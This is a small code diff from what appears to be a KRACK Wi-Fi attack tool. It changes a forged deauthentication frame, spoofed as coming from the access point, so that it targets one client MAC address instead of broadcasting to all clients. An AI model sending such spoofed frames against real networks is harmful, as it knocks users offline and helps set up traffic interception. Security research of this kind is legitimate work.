@@ -941,7 +941,7 @@ class KRAckAttack():
 		self.send_csa_beacon(numbeacons=4)
 
 		# Try to deauthenticated all clients
-		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
+		dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
 		deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
 		self.sock_real.send(deauth)
 
